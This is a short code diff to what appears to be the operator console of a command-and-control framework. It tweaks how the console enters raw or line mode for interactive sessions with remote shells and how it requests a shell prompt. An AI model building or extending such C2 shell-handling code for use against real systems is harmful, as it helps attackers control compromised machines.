@@ -341,6 +341,10 @@ def interactive_shell_session(shell_id: int):
     except Exception:
         old_settings = None
 
+    if old_settings is None:
+        # Raw mode is not available; raise to trigger fallback to line mode
+        raise OSError("stdin is not a TTY or cannot enter raw mode")
+
     print(f"[+] Interacting with shell {shell_id}. Press Ctrl-] to return to C2 console.")
     # Ensure the cursor is at the start of a new line in raw mode
     try:
@@ -353,9 +357,9 @@ def interactive_shell_session(shell_id: int):
 
     try:
         shell_socket.setblocking(False)
-        # Proactively request a prompt from remote shell
+        # Proactively request a prompt from remote shell (POSIX-safe)
         try:
-            shell_socket.sendall(b'echo -n "${PS1:-$ }"\n')
+            shell_socket.sendall(b'printf "%s" "${PS1:-$ }"\n')
         except Exception:
             pass
         while True:
@@ -468,6 +472,11 @@ def enter_shell_session(shell_id: int):
         current_session = ('shell', shell_id)
         line_mode_shell_id = shell_id
     print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
+    # Try to request a prompt immediately in line mode as well
+    try:
+        shell_sessions[shell_id]['socket'].sendall(b'printf "%s" "${PS1:-$ }"\n')
+    except Exception:
+        pass
 
 
 def wait_for_http_response(uid: str, timeout_seconds: int = 15):
